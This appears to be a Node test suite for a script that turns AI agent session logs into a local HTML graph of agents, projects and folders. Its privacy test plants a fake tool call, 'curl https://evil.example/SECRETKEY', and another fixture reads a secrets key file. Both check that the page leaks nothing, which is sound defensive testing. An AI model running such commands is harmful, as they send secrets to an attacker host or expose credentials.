// Tests for scripts/agent-graph.mjs, with small fake logs in a fake home (never your real logs).
//   node --test tests/*.test.mjs   (Node 24 reads a bare "tests/" as a module path, so name the files)
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { readLogs, buildGraph, projectOf, placeOf, LIMITS } from "../scripts/agent-graph.mjs";

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), "..", "scripts", "agent-graph.mjs");
const TMP = mkdtempSync(join(tmpdir(), "tongs-agents-"));
after(() => rmSync(TMP, { recursive: true, force: true }));

let n = 0;
function newHome() {
  const home = join(TMP, "zqhome" + ++n);
  mkdirSync(join(home, ".claude", "projects"), { recursive: true });
  return home;
}
const logsOf = home => join(home, ".claude", "projects");

// One assistant log line (one content block per line, like the real logs).
function line({ id, req = "r-" + id, model = "claude-opus-5-5", inp = 10, out = 5, cw = 0, cr = 100, cwd, tools = [], text }) {
  const content = tools.map((t, i) => ({ type: "tool_use", id: `${id}-t${i}`, name: t.name || "Read", input: t.input }));
  if (text) content.push({ type: "text", text });
  return JSON.stringify({
    type: "assistant", requestId: req, cwd, timestamp: "2026-10-23T10:00:00Z",
    message: { id, role: "assistant", model, content, usage: { input_tokens: inp, output_tokens: out, cache_creation_input_tokens: cw, cache_read_input_tokens: cr } },
  });
}
function write(home, rel, lines) {
  const p = join(logsOf(home), rel);
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, lines.join("\n") + "\n");
}
const run = (home, args = []) => spawnSync(process.execPath, [SCRIPT, "--no-open", ...args], { env: { ...process.env, HOME: home }, encoding: "utf8", timeout: 20000 });
const read = async home => { const r = await readLogs(logsOf(home), { home }); return { ...r, graph: buildGraph(r.agents) }; };

test("project names: tools/x counts as x, outside the home folder and Library are 'other'", () => {
  const h = "/home/fake";
  assert.equal(projectOf(h + "/forge/sub", h).name, "forge");
  assert.equal(projectOf(h + "/tools/zenith", h).name, "zenith");
  assert.equal(projectOf(h + "/tools/zenith", h).root, h + "/tools/zenith");
  assert.equal(projectOf("/elsewhere/x", h).name, "other");
  assert.equal(projectOf(h + "/Library/Application Support/x", h).name, "other");
  assert.equal(projectOf(h + "/.claude/worktrees/a", h).name, "other");
});

test("placeOf: folder in the project, root file, scratch for tmp and ~/.claude, other projects keep their name", () => {
  const h = "/home/fake";
  assert.deepEqual(placeOf(h + "/forge/packages/engine/a.js", "forge", h), { project: "forge", folder: "packages" });
  assert.deepEqual(placeOf(h + "/forge/CLAUDE.md", "forge", h), { project: "forge", folder: "(project root)" });
  assert.deepEqual(placeOf(h + "/forge/scripts", "forge", h), { project: "forge", folder: "scripts" }, "a bare folder name is a folder");
  assert.deepEqual(placeOf(h + "/tools/zenith-mc/src/x.js", "zenith", h), { project: "zenith-mc", folder: "src" }, "another project");
  assert.deepEqual(placeOf("/private/tmp/claude-501/x/out.txt", "forge", h), { project: "forge", folder: "scratch" });
  assert.deepEqual(placeOf(h + "/.claude/projects/x.jsonl", "forge", h), { project: "forge", folder: "scratch" });
  assert.deepEqual(placeOf(h + "/Library/x", "forge", h), { project: "forge", folder: "scratch" });
  assert.equal(placeOf(undefined, "forge", h), null);
});

test("the same message in a chat file and a subagent file is counted once; fresh and cached are split", async () => {
  const home = newHome(), cwd = home + "/forge";
  const dup = line({ id: "m1", inp: 100, out: 50, cw: 1000, cr: 9000, cwd });
  write(home, "-p/s1.jsonl", [dup, line({ id: "m2", inp: 1, out: 2, cr: 3, cwd })]);
  write(home, "-p/s1/subagents/agent-a.jsonl", [dup, line({ id: "m3", inp: 10, out: 20, cr: 30, cwd })]);
  const { agents } = await read(home);
  assert.equal(agents.reduce((s, a) => s + a.fresh, 0), 150 + 3 + 30, "m1 once, m2, m3");
  assert.equal(agents.reduce((s, a) => s + a.cached, 0), 10000 + 3 + 30);
});

test("a subagent is linked to its parent chat", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "a1", cwd })]);
  write(home, "-p/s1/subagents/agent-a.jsonl", [line({ id: "a2", cwd })]);
  const { graph } = await read(home);
  const sub = graph.nodes.find(x => x.type === "subagent"), chat = graph.nodes.find(x => x.type === "chat");
  assert.ok(sub && chat);
  assert.ok(graph.links.some(l => l.kind === "parent" && l.from === chat.id && l.to === sub.id));
});

test("folders come from file_path and path; Bash text is ignored; tmp paths are scratch, not 'shared'", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [
    line({ id: "b1", cwd, tools: [{ input: { file_path: cwd + "/packages/engine/a.js" } }, { name: "Grep", input: { path: cwd + "/scripts" } }] }),
    line({ id: "b2", cwd, tools: [{ name: "Bash", input: { command: "cat " + cwd + "/secrets/key.txt" } }, { input: { file_path: "/private/tmp/x/out.txt" } }] }),
  ]);
  const { agents } = await read(home);
  assert.deepEqual([...agents[0].folders.entries()].sort(), [["forge\tpackages", 1], ["forge\tscratch", 1], ["forge\tscripts", 1]]);
});

test("an agent that works in another project draws a crossing edge and a project-to-project bridge", async () => {
  const home = newHome(), a = home + "/forge", b = home + "/ai-tracker";
  write(home, "-p/s1.jsonl", [line({ id: "x1", out: 900, cwd: a, tools: [{ input: { file_path: a + "/src/a.js" } }, { input: { file_path: b + "/projects/forge.json" } }] })]);
  write(home, "-q/s2.jsonl", [line({ id: "x2", out: 800, cwd: b, tools: [{ input: { file_path: b + "/maps/a.md" } }] })]);
  const { graph } = await read(home);
  const chat = graph.nodes.find(n => n.type === "chat" && /Folders: src/.test(n.detail));
  assert.match(chat.detail, /Also worked in: ai-tracker/);
  assert.ok(graph.nodes.some(n => n.id === "f:ai-tracker:projects"), "the reached-into folder exists in the other project");
  assert.ok(graph.links.some(l => l.kind === "cross" && l.from === "f:ai-tracker:projects" && l.to === chat.id));
  assert.ok(graph.links.some(l => l.kind === "bridge" && l.from === "p:forge" && l.to === "p:ai-tracker" && l.n === 1));
});

test("caps: extra agents fold into one 'other agents (n)' node and the cap is not exceeded", async () => {
  const home = newHome(), cwd = home + "/forge";
  for (let i = 0; i < LIMITS.agentsPerProject + 5; i++) write(home, `-p/s${i}.jsonl`, [line({ id: "c" + i, out: 1000 - i, cwd })]);
  const { graph } = await read(home);
  assert.equal(graph.nodes.filter(x => x.type === "chat").length, LIMITS.agentsPerProject);
  const other = graph.nodes.find(x => x.type === "other");
  assert.match(other.label, /^other agents \(5\)$/);
});

test("bad lines are skipped and reported with file and line number; exit code stays 0", () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "d1", cwd }), '{"type":"assistant", broken', line({ id: "d2", cwd })]);
  const r = run(home, ["--dry-run"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stderr, /skipped bad line -p\/s1\.jsonl:2/);
  assert.match(r.stdout, /1 agents with tokens/);
});

test("--dry-run prints counts and writes nothing", () => {
  const home = newHome();
  write(home, "-p/s1.jsonl", [line({ id: "e1", cwd: home + "/forge" })]);
  const r = run(home, ["--dry-run"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /Dry run: nothing written/);
  assert.equal(existsSync(join(home, ".claude", "tongs-maps", "agents.html")), false);
});

test("no logs: says what to do and exits non-zero", () => {
  const r = run(newHome());
  assert.notEqual(r.status, 0);
  assert.match(r.stderr, /no agents found/);
});

test("same logs give byte-identical HTML", () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "f1", cwd, tools: [{ input: { file_path: cwd + "/a/b.js" } }] }), line({ id: "f2", model: "claude-sonnet-5-5", cwd: home + "/tools/zenith" })]);
  write(home, "-p/s1/subagents/agent-a.jsonl", [line({ id: "f3", model: "claude-haiku-5-5", cwd })]);
  const a = join(TMP, "a.html"), b = join(TMP, "b.html");
  assert.equal(run(home, ["--out", a]).status, 0);
  assert.equal(run(home, ["--out", b]).status, 0);
  assert.equal(readFileSync(a, "utf8"), readFileSync(b, "utf8"));
});

test("the page holds no external URLs, home folder, message text or session ids", () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-zqhome-secret-session/0f8fad5b-d9cb-469f-a165-70867728950e.jsonl", [
    line({ id: "g1", cwd, text: "SECRET-PROMPT-TEXT please keep private", tools: [
      { name: "Bash", input: { command: "curl https://evil.example/SECRETKEY" } },
      { input: { file_path: cwd + "/src/app.js" } } ] }),
  ]);
  const out = join(TMP, "private.html");
  assert.equal(run(home, ["--out", out]).status, 0);
  const html = readFileSync(out, "utf8");
  assert.ok(html.includes("<svg"), "it is the agent page");
  assert.ok(!/el\("(rect|polygon|ellipse)"/.test(html), "nodes are circles only");
  assert.ok((html.match(/el\("path"[^)]*\)/g) || []).every(c => c.includes("bridge")), "paths are only the project-to-project bridges");
  const urls = (html.match(/https?:\/\/[^\s"'<>)]+/g) || []).filter(u => u !== "http://www.w3.org/2000/svg");
  assert.deepEqual(urls, [], "only the SVG namespace may look like a URL");
  assert.ok(!/(src|href)\s*=/.test(html) && !/url\(\s*['"]?https?:/.test(html), "nothing is loaded from the network");
  for (const bad of ["/Users/", "zqhome", "SECRET-PROMPT-TEXT", "SECRETKEY", "0f8fad5b", "evil.example", home]) {
    assert.ok(!html.includes(bad), "page must not contain " + bad);
  }
  assert.ok(html.includes("Content-Security-Policy"));
});

test("a line holding U+2028 inside its text is one line, not a bad line", async () => {
  const home = newHome(), cwd = home + "/forge";
  write(home, "-p/s1.jsonl", [line({ id: "h1", cwd, text: "before after" }), line({ id: "h2", cwd })]);
  const r = await readLogs(logsOf(home), { home });
  assert.deepEqual(r.problems, []);
  assert.equal(r.agents[0].fresh, 30);
});
